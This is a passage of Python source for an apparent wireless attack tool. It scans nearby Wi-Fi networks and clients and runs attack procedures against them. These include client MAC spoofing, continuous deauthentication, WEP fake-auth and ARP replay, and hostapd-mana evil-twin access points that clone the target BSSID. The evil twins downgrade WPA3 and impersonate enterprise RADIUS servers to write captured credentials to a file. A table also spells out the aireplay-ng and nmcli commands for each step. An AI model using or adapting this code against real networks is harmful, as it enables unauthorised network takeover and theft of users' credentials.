    if not out["ip"]:
        return out
    try:
        r = subprocess.run(["ip", "-4", "route", "show", "dev", iface],
                           capture_output=True, text=True, timeout=3)
        for line in r.stdout.splitlines():
            if line.startswith("default via "):
                out["gw"] = line.split()[2]
                break
    except Exception:
        pass
    if out["gw"]:
        try:
            r = subprocess.run(["ping", "-c", "2", "-W", "2", out["gw"]],
                               capture_output=True, text=True, timeout=8)
            out["local_icmp"] = "2 received" in r.stdout
        except Exception:
            pass
    try:
        r = subprocess.run(
            ["curl", "-s", "-o", "/dev/null",
             "-w", "%{http_code}", "--max-time", "6",
             "http://captive.apple.com"],
            capture_output=True, text=True, timeout=8)
        code = (r.stdout or "").strip()
        out["http_code"] = code or "(none)"
        out["http_ok"] = code.startswith(("2", "3"))
    except Exception:
        out["http_code"] = "(curl failed)"
    try:
        r = subprocess.run(["ping", "-c", "2", "-W", "2", "8.8.8.8"],
                           capture_output=True, text=True, timeout=8)
        out["internet_icmp"] = "2 received" in r.stdout
    except Exception:
        pass
    return out

def write_nm_dropin(cloned):
    # Scope the drop-in to the spoof adapter only.  Without match-device,
    # [connection] applies to every wifi interface, so spoofing wlan0 also
    # changes wlan1's MAC and breaks the monitor adapter's scanning.
    iface = SPOOF()
    text = (
        "[device]\n"
        f"match-device=interface-name:{iface}\n"
        "wifi.scan-rand-mac-address=no\n"
        "\n"
        "[connection]\n"
        f"match-device=interface-name:{iface}\n"
        f"wifi.cloned-mac-address={cloned}\n"
        "wifi.mac-address-randomization=never\n"
    )
    _run_sudo("rm", "-f", "/tmp/00-wsa.conf")
    with open("/tmp/00-wsa.conf", "w") as f:
        f.write(text)
    _run_sudo("mkdir", "-p", "/etc/NetworkManager/conf.d")
    _run_sudo("cp", "/tmp/00-wsa.conf", NM_DROPIN)
    _run_sudo("chmod", "644", NM_DROPIN)

def save_station(folder, mac):
    tf = f"{folder}/target_info.txt"
    if not os.path.exists(tf):
        return
    for line in open(tf):
        if ":" in line:
            k, v = line.split(":", 1)
            if (k.strip().lower() == "station"
                    and v.strip().upper() == mac.upper()):
                return
    with open(tf, "a") as f:
        f.write(f"STATION:           {mac}\n")

def role_signals(ignore_sigint=False):
    if ignore_sigint:
        signal.signal(signal.SIGINT, signal.SIG_IGN)
    signal.signal(signal.SIGHUP,  lambda s, f: _role_exit())
    signal.signal(signal.SIGTERM, lambda s, f: _role_exit())

def _role_exit():
    restore()
    print()
    sys.exit(0)

# ── evil twin shared helpers ───────────────────────────────────────────────

def evil_kill_hostapd():
    """Kill hostapd / hostapd-mana / airodump cleanly."""
    subprocess.run(["sudo", "pkill", "-TERM", "-f", "hostapd"],
                   stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    subprocess.run(["sudo", "pkill", "-TERM", "-f", "airodump-ng"],
                   stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    for _ in range(15):
        r = subprocess.run(["pgrep", "-f", "hostapd"],
                           capture_output=True, text=True)
        if not r.stdout.strip():
            return
        time.sleep(0.5)
    subprocess.run(["sudo", "pkill", "-KILL", "-f", "hostapd"],
                   stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    time.sleep(0.3)
    subprocess.run(["sudo", "pkill", "-KILL", "-f", "airodump-ng"],
                   stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    time.sleep(0.3)

def evil_set_ap_mode(iface, target_bssid=None):
    subprocess.run(["sudo", "ip", "link", "set", iface, "down"],
                   stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    time.sleep(0.8)
    # clone target BSSID onto the interface MAC before AP transition
    # so hostapd's bssid= directive can bind
    if target_bssid:
        subprocess.run(["sudo", "ip", "link", "set", iface, "address", target_bssid],
                       stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
        time.sleep(0.4)
    subprocess.run(["sudo", "iw", "dev", iface, "set", "type", "__ap"],
                   stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    subprocess.run(["sudo", "nmcli", "dev", "set", iface, "managed", "no"],
                   stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    time.sleep(0.3)
    subprocess.run(["sudo", "ip", "link", "set", iface, "up"],
                   stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    time.sleep(0.8)

def evil_adapter_mode(iface):
    try:
        r = subprocess.run(["iw", "dev", iface, "info"],
                           capture_output=True, text=True, timeout=2)
        out = r.stdout.lower()
        if "type monitor" in out: return "monitor mode"
        if "type managed" in out: return "managed mode"
        if "type ap" in out:      return "ap mode"
    except Exception:
        pass
    return "unknown"

def evil_chronometer(name, context=""):
    stop  = threading.Event()
    start = time.time()
    pane  = os.environ.get("TMUX_PANE")
    if not pane:
        return None, None

    def tick():
        while not stop.is_set():
            elapsed = int(time.time() - start)
            h, rem  = divmod(elapsed, 3600)
            m, s    = divmod(rem, 60)
            t = f"{h:d}:{m:02d}:{s:02d}" if h else f"{m:02d}:{s:02d}"
            title = f"▌ {name} ▌ T+{t}"
            if context:
                title += f" ▌ {context}"
            subprocess.run(
                ["tmux", "select-pane", "-t", pane, "-T", title],
                stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
            time.sleep(1)

    thread = threading.Thread(target=tick, daemon=True)
    thread.start()
    return stop, thread

def evil_read_conf_bssid(conf):
    try:
        for line in open(conf):
            if line.strip().startswith("bssid="):
                return line.split("=", 1)[1].strip()
    except Exception:
        pass
    return None

def evil_read_conf_channel(conf):
    try:
        for line in open(conf):
            if line.strip().startswith("channel="):
                return line.split("=", 1)[1].strip()
    except Exception:
        pass
    return "6"

def evil_write_conf_personal(iface, essid, bssid, ch, conf):
    text = f"""interface={iface}
bssid={bssid}
driver=nl80211
ssid={essid}
channel={ch}
hw_mode=g
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
rsn_pairwise=CCMP
wpa_passphrase=downgrade123
auth_algs=3
"""
    dbg(f"write_conf_personal: iface={iface!r} essid={essid!r} bssid={bssid!r} ch={ch!r} conf={conf!r}")
    dbg(f"write_conf_personal: text_len={len(text)}")
    subprocess.run(["sudo", "rm", "-f", conf],
                   stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    with open(conf, "w") as f:
        f.write(text)
    _ok = os.path.exists(conf)
    _sz = os.path.getsize(conf) if _ok else -1
    dbg(f"write_conf_personal: after write exists={_ok} size={_sz}")
    try:
        _run_sudo("chown", f"{os.getuid()}:{os.getgid()}", conf)
    except Exception:
        pass



def evil_write_conf_enterprise(iface, essid, bssid, ch, folder, conf):
    text = f"""interface={iface}
bssid={bssid}
driver=nl80211
ssid={essid}
channel={ch}
hw_mode=g
wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP
rsn_pairwise=CCMP
ieee8021x=1
eap_server=1
eap_user_file=/etc/hostapd-mana/certs/hostapd.eap_user
ca_cert=/etc/hostapd-mana/ca.pem
server_cert=/etc/hostapd-mana/server.pem
private_key=/etc/hostapd-mana/server.key
dh_file=/etc/hostapd-mana/certs/dhparam.pem
mana_wpe=1
mana_eapsuccess=1
mana_credout={folder}/credentials.txt
"""
    dbg(f"write_conf_enterprise: iface={iface!r} essid={essid!r} bssid={bssid!r} ch={ch!r} folder={folder!r}")
    subprocess.run(["sudo", "rm", "-f", conf],
                   stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    with open(conf, "w") as f:
        f.write(text)
    _ok = os.path.exists(conf)
    _sz = os.path.getsize(conf) if _ok else -1
    dbg(f"write_conf_enterprise: after write exists={_ok} size={_sz}")
    try:
        _run_sudo("chown", f"{os.getuid()}:{os.getgid()}", conf)
    except Exception:
        pass



def evil_run_hostapd(iface, conf, log_path, log_name, extract_fn):
    if not shutil.which("hostapd-mana"):
        restore(); clear()
        print(f"       {ERR}ERROR:{R} hostapd-mana not found in PATH")
        print()
        input(" press ENTER to return ")
        return

    evil_kill_hostapd()
    # If conductor already put the interface into AP mode and cloned
    # the target BSSID onto the interface MAC, do NOT transition it
    # again — rtw88 wedges on rapid down/__ap/up cycles.  Only do
    # the full prep when the interface is not yet in AP mode (manual
    # mode where the operator just clicked activate without conductor
    # having prepped).
    try:
        _r = subprocess.run(["iw", "dev", iface, "info"],
                            capture_output=True, text=True, timeout=2)
        _already_ap = "type ap" in _r.stdout.lower()
    except Exception:
        _already_ap = False
    if not _already_ap:
        subprocess.run(["sudo", "ip", "link", "set", iface, "down"],
                       stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
        time.sleep(0.3)
        _target_bssid = evil_read_conf_bssid(conf)
        evil_set_ap_mode(iface, target_bssid=_target_bssid)

    restore(); clear(); print(); print()
    sys.stdout.flush()

    stop, thread = evil_chronometer("ROGUE AP",
                                    f"CH {evil_read_conf_channel(conf)}")

    proc = subprocess.Popen(
        ["sudo", "hostapd-mana", conf],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True, bufsize=1)

    with open(log_path, "a") as log:
        for line in proc.stdout:
            sys.stdout.write(line)
            sys.stdout.flush()
            log.write(line)
            log.flush()

    if stop:  stop.set()
    if thread: thread.join(timeout=2)

    try:
        proc.terminate()
        proc.wait(timeout=2)
    except subprocess.TimeoutExpired:
        proc.kill(); proc.wait()
    except Exception:
        pass

    evil_kill_hostapd()
    set_pane_title(log_name)
    extract_fn()

def _ensure_monitor_unmanaged(iface=None, log=None):
    """Make the monitor adapter permanently invisible to NM.

    Without this, NM auto-connects the monitor adapter to any SSID it
    has a saved profile for, flipping the interface out of monitor mode
    and producing rtw88 USB control-pipe timeouts.  Idempotent — safe
    to call on every run.
    """
    iface    = iface or MONITOR()
    dropin   = "/etc/NetworkManager/conf.d/99-wsa-monitor.conf"
    expected = (
        "# WSA: monitor adapter is engine-controlled, NM must not touch it\n"
        "[keyfile]\n"
        f"unmanaged-devices=interface-name:{iface}\n"
    )

    current = None
    if os.path.exists(dropin):
        try:
            current = open(dropin).read()
        except Exception:
            pass

    if current != expected:
        fd, tmp = tempfile.mkstemp(suffix=".conf")
        try:
            with os.fdopen(fd, "w") as f:
                f.write(expected)
            _sudo(["cp", tmp, dropin])
            _sudo(["chmod", "644", dropin])
        finally:
            try: os.unlink(tmp)
            except OSError: pass
        if log: log("status", f"nm: excluding {iface} from management")
        _sudo(["systemctl", "restart", "NetworkManager"], timeout=25)
        time.sleep(5)
    elif log:
        log("status", f"nm: {iface} already excluded")

    try:
        r = subprocess.run(
            ["nmcli", "-t", "-f", "DEVICE,STATE", "dev", "status"],
            capture_output=True, text=True, timeout=5)
        for line in r.stdout.splitlines():
            if line.startswith(f"{iface}:"):
                state = line.split(":", 1)[1]
                return state == "unmanaged"
    except Exception:
        pass
    return False

def _set_monitor_mode(iface):
    """Bring iface into monitor mode. No-op if already monitor."""
    subprocess.run(["sudo", "ip", "link", "set", iface, "down"],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(0.5)
    subprocess.run(["sudo", "iw", "dev", iface, "set", "type", "monitor"],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(0.5)
    subprocess.run(["sudo", "ip", "link", "set", iface, "up"],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(1.2)

# ═══════════════════════════════════════════════════════════════════════════
# SECTION 5 · RECON + TARGET SELECTION
# ═══════════════════════════════════════════════════════════════════════════

def _recon_hidden(s):
    return (not s) or HIDDEN_RE.match(s.strip())

def run_recon():
    set_pane_title("RECONNAISSANCE")
    iface = MONITOR()

    if subprocess.run(["ip", "link", "show", iface],
                      stdout=subprocess.DEVNULL,
                      stderr=subprocess.DEVNULL).returncode != 0:
        clear()
        print(f"  {ERR}ERROR:{R} adapter '{iface}' not found")
        print()
        input(f"   {LBL}press ENTER to return ▸{R} ")
        return None

    # exclude the monitor adapter from NM before any mode change so it
    # cannot race us by auto-connecting to a remembered SSID mid-scan.
    restore(); clear()
    standard_header()
    print()
    print(rule("reconnaissance"))
    print(f"       {WHT}excluding {iface} from NetworkManager ...{R}")
    print()
    sys.stdout.flush()
    _ensure_monitor_unmanaged(iface)

    # ensure monitor mode
    restore(); clear()
    standard_header()
    print()
    print(rule("reconnaissance"))
    print(f"       {WHT}preparing {iface} for monitor mode ...{R}")
    print()
    sys.stdout.flush()
    _set_monitor_mode(iface)

    subprocess.run("sudo rm -f /tmp/wsa_scan-*", shell=True,
                   stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)

    restore(); clear()
    standard_header()
    print()
    print(rule("reconnaissance"))
    print(f"       {WHT}scanning with {iface}{R}")
    print(f"       {WHT}Ctrl+C when your targets appear{R}")
    print()
    sys.stdout.flush()

    # During airodump, install default_int_handler so Ctrl+C raises
    # KeyboardInterrupt (caught below) instead of exiting the whole
    # tool.  Without this, the outer SIGINT handler calls sys.exit(0)
    # which SystemExit cannot be caught by "except KeyboardInterrupt"
    # and the recon step exits entirely instead of continuing to
    # target selection.
    _saved_sigint = signal.signal(signal.SIGINT, signal.default_int_handler)
    try:
        subprocess.run(["sudo", "airodump-ng", "--band", "abg",
                        "--output-format", "csv,pcap",
                        "-w", "/tmp/wsa_scan", iface])
    except KeyboardInterrupt:
        pass
    finally:
        signal.signal(signal.SIGINT, _saved_sigint)

    csv_file = "/tmp/wsa_scan-01.csv"
    if not os.path.exists(csv_file):
        restore()
        print()
        print(f"  {ERR}ERROR:{R} no scan file produced")
        print(f"       {WHT}verify {iface} supports monitor mode{R}")
        print()
        input(f"   {LBL}press ENTER to return ▸{R} ")
        return None
    return csv_file

def _read_scan_csv(csv_file):
    """Parse airodump CSV.  Returns list of AP dicts; each AP gains
    ap["recon_stations"] = set of station MACs associated with it that
    were observed during the recon capture.  Stations are parsed from
    the Station section of the same CSV so no rescan is needed just to
    count clients."""
    aps   = []
    stations_by_bssid = {}
    in_ap = True
    try:
        for row in csv.reader(open(csv_file, errors="ignore")):
            if not row or not row[0]:
                continue
            if "Station MAC" in row[0]:
                in_ap = False
                continue
            if not in_ap:
                if len(row) < 6:
                    continue
                mac   = row[0].strip().upper()
                assoc = row[5].strip().upper()
                if (mac and assoc
                        and ":" in mac and ":" in assoc
                        and not mac.startswith("FF:")
                        and mac != assoc):
                    stations_by_bssid.setdefault(assoc, set()).add(mac)
                continue
            if "BSSID" in row[0] or len(row) < 14:
                continue
            if ":" not in row[0]:
                continue
            raw     = row[13].strip()
            auth_up = (row[7] or "").upper()
            priv_up = (row[5] or "").upper()
            # PMF inference — the recon CSV does not carry beacon RSN
            # capabilities, so this is a best-effort label:
            #   req  WPA3 / SAE mandates 802.11w
            #   opt  enterprise MGT/EAP is often PMF-capable
            #   -    unknown without beacon parse
            if "SAE" in auth_up or "WPA3" in priv_up:
                pmf = "req"
            elif "MGT" in auth_up or "EAP" in auth_up:
                pmf = "opt"
            else:
                pmf = "-"
            aps.append({
                "bssid":   row[0].strip(),
                "channel": row[3].strip(),
                "privacy": row[5].strip(),
                "cipher":  row[6].strip(),
                "auth":    row[7].strip(),
                "power":   row[8].strip(),
                "essid":   "(hidden)" if _recon_hidden(raw) else raw,
                "hidden":  _recon_hidden(raw),
                "pmf":     pmf,
            })
    except Exception:
        pass
    for ap in aps:
        ap["recon_stations"] = stations_by_bssid.get(
            ap["bssid"].upper(), set())
    aps.sort(key=lambda a: int(a["power"] or -100), reverse=True)
    return aps

def _probe_pmf_map(cap_path):
    """Parse beacons in cap_path -> {bssid: 'req'|'cap'|'-'}.
    Reads RSN Capabilities MFPC/MFPR bits.
    """
    result = {}
    if not shutil.which("tshark") or not os.path.exists(cap_path):
        return result
    try:
        r = subprocess.run(
            ["tshark", "-r", cap_path,
             "-Y", "wlan.fc.type_subtype == 0x08",
             "-T", "fields",
             "-e", "wlan.bssid",
             "-e", "wlan.rsn.capabilities.mfpc",
             "-e", "wlan.rsn.capabilities.mfpr",
             "-c", "2000"],
            capture_output=True, text=True, timeout=15)
        for line in r.stdout.splitlines():
            parts = line.split("\t")
            if len(parts) < 2:
                continue
            bssid = parts[0].strip().upper().replace("-", ":")
            mfpc  = parts[1].strip() if len(parts) > 1 else ""
            mfpr  = parts[2].strip() if len(parts) > 2 else ""
            if not bssid or not mfpc:
                continue
            if mfpc == "1" and mfpr == "1":
                result[bssid] = "req"
            elif mfpc == "1":
                result[bssid] = "cap"
            elif mfpc == "0":
                result[bssid] = "-"
    except Exception:
        pass
    return result

def _enrich_pmf_from_cap(aps, cap_path):
    """Refine ap['pmf'] from beacon RSN caps. Silent no-op on failure."""
    pmf_map = _probe_pmf_map(cap_path)
    if not pmf_map:
        return
    for ap in aps:
        bssid = ap["bssid"].upper().replace("-", ":")
        if bssid in pmf_map:
            ap["pmf"] = pmf_map[bssid]

def _classify_target(privacy, auth):
    priv = (privacy or "").upper()
    auth = (auth or "").upper()
    if "OPN" in priv:                  return "OPEN"
    if "WEP" in priv:                  return "WEP"
    if "MGT" in auth or "EAP" in auth: return "WPA-ENTERPRISE"
    if "SAE" in auth:                  return "WPA3"
    return "WPA-PERSONAL"

def _pick_folder(base):
    path = os.path.join(ASSESSMENTS_DIR, base)
    if not os.path.exists(path):
        return base
    n = 2
    while os.path.exists(os.path.join(ASSESSMENTS_DIR, f"{base}_{n}")):
        n += 1
    return f"{base}_{n}"

def _safe_folder_name(essid):
    """Sanitise ESSID for use as a folder name. Never empty, never nested."""
    safe = re.sub(r'[^A-Za-z0-9_\-]', '_', essid or "")
    safe = safe.strip("_")[:64]
    return safe or "unknown"

def _tmux_out(args):
    """Run tmux, return stdout stripped. patch24"""
    try:
        r = subprocess.run(["tmux", *args],
                           stdout=subprocess.PIPE,
                           stderr=subprocess.PIPE,
                           text=True)
        return r.stdout.strip()
    except Exception:
        return ""

def _list_panes():
    """Return list of (index, pane_id, is_master) sorted by index.
    is_master is True for the pane running this process.
    patch26"""
    out = _tmux_out(["list-panes", "-t", SESSION,
                     "-F", "#{pane_index}:#{pane_id}"])
    my_pane = os.environ.get("TMUX_PANE", "")
    panes = []
    for line in out.splitlines():
        if ":" in line:
            idx, pid = line.split(":", 1)
            pid = pid.strip()
            try:
                panes.append((int(idx), pid, pid == my_pane))
            except ValueError:
                pass
    panes.sort()
    return panes

def _deploy_flow_panes(procedure):
    """Deploy worker panes and RETURN role\u2192pane_id mapping.

    Each split-window call passes the worker's python command directly
    to tmux, so the pane starts the worker as its initial process \u2014
    no interactive shell, no prompt flash between C-c and clear.
    """
    _tmux("set-option", "-t", SESSION, "mouse", "off")
    _tmux("refresh-client", "-S")

    master_id = _tmux_out(["display-message", "-p", "#{pane_id}"])
    if not master_id:
        lst = _tmux_out(["list-panes", "-t", SESSION, "-F", "#{pane_id}"])
        if lst:
            master_id = lst.split("\n")[0]

    if not master_id:
        dbg("deploy: cannot identify master pane")
        _tmux("set-option", "-t", SESSION, "mouse", "on")
        return {}

    panes = _list_panes()
    for _, pid, _ in panes:
        if pid != master_id:
            _tmux("kill-pane", "-t", pid)
    time.sleep(0.4)

    roles = {
        "OPEN":           ["capture", "mac", "ping", "deauth"],
        "WEP":            ["capture", "fakeauth", "arpreplay", "deauth"],
        "WPA-PERSONAL":   ["evil_twin"],
        "WPA3":           ["evil_twin"],
        "WPA-ENTERPRISE": ["evil_twin"],
    }[procedure]

    engine = os.path.abspath(__file__)
    mapping = {}
    worker_ids = []

    for n, role in enumerate(roles):
        actual = role
        if role == "evil_twin":
            if procedure == "WPA-PERSONAL":     actual = "evil_twin_personal"
            elif procedure == "WPA3":           actual = "evil_twin_personal"
            elif procedure == "WPA-ENTERPRISE": actual = "evil_twin_enterprise"

        cmd = f"clear; exec python3 {shlex.quote(engine)} --role={actual}"

        if n == 0:
            nid = _tmux_out(["split-window", "-h",
                             "-P", "-F", "#{pane_id}",
                             "-t", master_id, cmd])
        else:
            pct   = {2: 75, 3: 66, 4: 50}.get(n + 1, 50)
            tgt   = worker_ids[-1]
            nid   = _tmux_out(["split-window", "-v", "-p", str(pct),
                               "-P", "-F", "#{pane_id}",
                               "-t", tgt, cmd])

        if not nid:
            dbg(f"deploy: split {n + 1} failed")
            break
        time.sleep(0.8)
        worker_ids.append(nid)
        mapping[role] = nid

    _tmux("select-pane", "-t", master_id)
    time.sleep(1.5)
    _tmux("refresh-client", "-S")
    _tmux("set-option", "-t", SESSION, "mouse", "on")

    final = _list_panes()
    if len(final) <= 1:
        dbg(f"deploy: FAILED, only {len(final)} panes")
        print(f"\n {ERR}[!] Failed to deploy worker panes.{R}")
        w = _tmux_out(["display-message", "-p", "#{window_width}"])
        h = _tmux_out(["display-message", "-p", "#{window_height}"])
        print(f" {WHT}terminal size: {w}x{h}  (need 80x24 per pane){R}")
        time.sleep(3)
        return {}

    dbg(f"deploy: OK mapping={mapping}")
    return mapping

def _kill_worker_panes():
    """Kill every pane except this one. patch26"""
    panes = _list_panes()
    if not panes:
        return
    master_id = None
    for _, pid, is_master in panes:
        if is_master:
            master_id = pid
            break
    if master_id is None:
        master_id = panes[0][1]
    for _, pid, _ in panes:
        if pid != master_id:
            _tmux("kill-pane", "-t", pid)
    time.sleep(0.3)
    _tmux("select-pane", "-t", master_id, "-T", "CAPTURE PROCEDURE")

# ── procedure text · manual view · book v5 ────────────────────────────────

_PROCEDURE_STEPS = {
    "OPEN": [
        ("1", "Capture", "PANEL 1 CAPTURE",
         ["Lock capture and wait until station detection.",
          "Once station detected engage step [2]."],
         ["airodump-ng -c <CH> --bssid <AP> <MON>"]),
        ("2", "Spoof", "PANEL 2 MAC",
         ["Spoof wlan0 MAC to match target station adapter MAC.",
          "Once wlan0 MAC spoofed engage step [3]."],
         ["nmcli connection modify <PROFILE> wifi.cloned-mac-address <STATION_MAC>",
          "nmcli connection up <PROFILE>"]),
        ("3", "Deauth", "PANEL 3 DEAUTH",
         ["Deauth continuously the target station adapter MAC.",
          "Once continuous deauth initiated engage step [4]."],
         ["aireplay-ng -0 5 -a <AP> <MON>",
          "aireplay-ng -0 5 -a <AP> -c <STATION_MAC> <MON>"]),
        ("4", "Confirm", "PANEL 4 CONFIRM",
         ["Ping console connects wlan0 to the target ESSID, then pings 8.8.8.8.",
          "If ping fails but IP from target subnet is present, spoof is confirmed.",
          "Once ping 8.8.8.8 outputs, confirm capture → main menu → analysis."],
         ["nmcli dev wifi connect <ESSID> ifname wlan0  # automatic in ping console",
          "ping 8.8.8.8"]),
    ],
    "WEP": [
        ("1", "Capture", "PANEL 1 CAPTURE",
         ["Lock capture and wait until station detection.",
          "Once station detected engage step [2]."],
         ["airodump-ng -c <CH> --bssid <AP> <MON>"]),
        ("2", "Fake Auth", "PANEL 2 FAKEAUTH",
         ["Send fake authentication to target AP.",
          "Once fake auth sent engage step [3]."],
         ["aireplay-ng --fakeauth 0 -a <AP> -h <ADAPTER_MAC> <MON>"]),
        ("3", "ARP Replay", "PANEL 3 ARPREPLAY",
         ["Replay ARP requests sourced with adapter MAC.",
          "If not associated, replay with station MAC.",
          "Once replay running engage step [4]."],
         ["aireplay-ng --arpreplay -b <AP> -h <ADAPTER_MAC> <MON>",
          "aireplay-ng --arpreplay -b <AP> -h <STATION_MAC> <MON>"]),
        ("4", "Harvest IVs", "PANEL 4 DEAUTH",
         ["Deauth target station to stimulate IV collection.",
          "Watch IVs climb toward threshold 50,000.",
          "Once threshold reached, confirm capture → main menu → analysis."],
         ["aireplay-ng -0 5 -a <AP> <MON>",
          "aireplay-ng -0 5 -a <AP> -c <STATION_MAC> <MON>"]),
    ],
    "WPA-PERSONAL": [
        ("1", "Deploy Evil Twin With Channel Hopping", "PANEL 1 EVIL_TWIN",
         ["Wait for client association/handshakes on each channel deployment.",
          "Once handshake captured, confirm capture → main menu → analysis."],
         ["hostapd-mana /tmp/wsa_evil_twin.conf"]),
    ],
    "WPA3": [
        ("1", "Deploy Evil Twin With SAE Downgrade And Channel Hopping", "PANEL 1 EVIL_TWIN",
         ["Wait for client association/handshakes on each channel deployment.",
          "Once handshake captured, confirm capture → main menu → analysis."],
         ["hostapd-mana /tmp/wsa_evil_twin.conf"]),
    ],
    "WPA-ENTERPRISE": [
        ("1", "Deploy Evil Twin With RADIUS Impersonation And Channel Hopping", "PANEL 1 EVIL_TWIN",
         ["Wait for client EAP authentication/credentials on each channel deployment.",
          "Once credentials captured, confirm capture → main menu → analysis."],
         ["hostapd-mana /tmp/wsa_evil_twin.conf"]),
    ],
}

_PROCEDURE_TITLES = {
    "OPEN":           "OPEN CAPTURE PROCEDURE",
    "WEP":            "WEP CAPTURE PROCEDURE",
    "WPA-PERSONAL":   "WPA-PERSONAL EVIL TWIN CAPTURE PROCEDURE",
    "WPA3":           "WPA3-PERSONAL EVIL TWIN DOWNGRADE CAPTURE PROCEDURE",
    "WPA-ENTERPRISE": "WPA-ENTERPRISE EVIL TWIN CAPTURE PROCEDURE",
}

_METHOD_KEY_MAP = {
    "OPEN":         "OPEN",
    "WEP":          "WEP",
    "WPA_PERSONAL": "WPA-PERSONAL",
    "WPA3":         "WPA3",
    "ENTERPRISE":   "WPA-ENTERPRISE",
}

_PROCEDURE_DRAWINGS = {
    ("OPEN", "1"): r"""
   ┌─────────────────────────────────────┐       ┌─────────────────────────────────────┐
   │   AP                                │       │   AP                                │
   │   (•)                               │       │   (•) ◂────────────────────────┐    │
   │    ┴                                │       │    ┴                           │    │
   │    ▲                                │       │    ▲                           │    │
   │    │1                               │       │    │1                          │    │
   │    │                                │       │    │                           ▾    │
   │    └───► (•)                        │       │    └───► (•)                  (•)   │
   │           │ wlan1                   │       │           │ wlan1              │A0  │
   │           ┌─────┐                   │       │           ┌─────┐        ┌─────┐    │
   │           │ D1  │                   │       │           │ D1  │        │ D0  │    │
   │          /───────\                  │       │          /───────\      /───────\   │
   │                                     │       │                                     │
   └─────────────────────────────────────┘       └─────────────────────────────────────┘""",

    ("OPEN", "2"): r"""
   ┌─────────────────────────────────────┐
   │   AP                                │
   │   (•) ◂────────────────────────┐    │
   │    ┴                           │    │
   │     ▲                          │    │
   │     │1                         │    │
   │     │                          ▾    │
   │     └───►(•)                  (•)   │
   │           │ wlan1              │A0  │
   │           ┌─────┐        ┌─────┐    │
   │        (•)│ D1  │        │ D0  │    │
   │         │/───────\      /───────\   │
   │         2 wlan0 [MAC→A0]            │
   └─────────────────────────────────────┘""",

    ("OPEN", "3"): r"""
   ┌─────────────────────────────────────┐
   │   AP                                │
   │   (•) ◂────────────────────────┐    │
   │    ┴                           │    │
   │     ▲                          │    │
   │     │1                         │    │
   │     │                          ▾    │
   │     └───►(•)                  (•)   │
   │           │ wlan1              │A0  │
   │           ┌─────┐        ┌─────┐    │
   │        (•)│ D1  │        │ D0  │    │
   │         │/───────\      /───────\   │
   │         2 wlan0 [MAC→A0]            │
   └─────────────────────────────────────┘""",

    ("OPEN", "4"): r"""
   ┌─────────────────────────────────────┐
   │   AP      x                         │
   │   (•) ◂───x────────────────────┐    │
   │    ┴      x                    │    │
   │     ▲     x                    │    │
   │     │1    x                    │    │
   │     │     x                    │    │
   │     │     x 3                  ▾    │
   │     └───►(•)                  (•)   │
   │           │ wlan1              │A0  │
   │           ┌─────┐        ┌─────┐    │
   │        (•)│ D1  │        │ D0  │    │
   │         │/───────\      /───────\   │
   │        2 wlan0 [MAC→A0]             │
   └─────────────────────────────────────┘""",

    ("WEP", "1"): r"""
   ┌─────────────────────────────────────┐       ┌─────────────────────────────────────┐
   │   AP                                │       │   AP                                │
   │   (•)                               │       │   (•) ◂────────────────────────┐    │
   │    ┴                                │       │    ┴                           │    │
   │    ▲                                │       │    ▲                           │    │
   │    │1                               │       │    │1                          │    │
   │    │                                │       │    │                           ▾    │
   │    └───► (•)                        │       │    └───► (•)                  (•)   │
   │           │ wlan1                   │       │           │ wlan1              │A0  │
   │           ┌─────┐                   │       │           ┌─────┐        ┌─────┐    │
   │           │ D1  │                   │       │           │ D1  │        │ D0  │    │
   │          /───────\                  │       │          /───────\      /───────\   │
   │                                     │       │                                     │
   └─────────────────────────────────────┘       └─────────────────────────────────────┘""",

    ("WEP", "2"): r"""
   ┌─────────────────────────────────────┐
   │   AP                                │
   │   (•) ◂────────────────────────┐    │
   │    ┴                           │    │
   │   ▲ ▲                          │    │
   │   │2│1                         │    │
   │   │ │                          │    │
   │   │ │                          ▾    │
   │   │ └───►(•)                  (•)   │
   │   └─────► │ wlan1              │A0  │
   │           ┌─────┐        ┌─────┐    │
   │           │ D1  │        │ D0  │    │
   │          /───────\      /───────\   │
   │                                     │
   └─────────────────────────────────────┘""",

    ("WEP", "3"): r"""
   ┌─────────────────────────────────────┐
   │   AP                                │
   │   (•) ◂────────────────────────┐    │
   │    ┴                           │    │
   │ ▲ ▲ ▲                          │    │
   │ │3│2│1                         │    │
   │ │ │ │                          │    │
   │ │ │ │                          ▾    │
   │ │ │ └───►(•)                  (•)   │
   │ │ └─────► │ wlan1              │A0  │
   │ └───────► ┌─────┐        ┌─────┐    │
   │           │ D1  │        │ D0  │    │
   │          /───────\      /───────\   │
   │                                     │
   └─────────────────────────────────────┘""",

    ("WEP", "3p"): r"""
   ┌─────────────────────────────────────┐
   │   AP                                │
   │   (•) ◂────────────────────────┐    │
   │    ┴                           │    │
   │ ▲ ▲ ▲                          │    │
   │ │3│2│1                         │    │
   │ │ │ │                          │    │
   │ │ │ │                          ▾    │
   │ │ │ └───►(•)                  (•)   │
   │ │ └─────► │ wlan1              │A0  │
   │ └───────► ┌─────┐        ┌─────┐    │
   │           │ D1  │        │ D0  │    │
   │          /───────\      /───────\   │
   │                                     │
   └─────────────────────────────────────┘""",

    ("WEP", "4"): r"""
   ┌─────────────────────────────────────┐
   │   AP      x                         │
   │   (•) ◂───x────────────────────┐    │
   │    ┴      x                    │    │
   │ ▲ ▲ ▲     x                    │    │
   │ │3│2│1    x4                   │    │
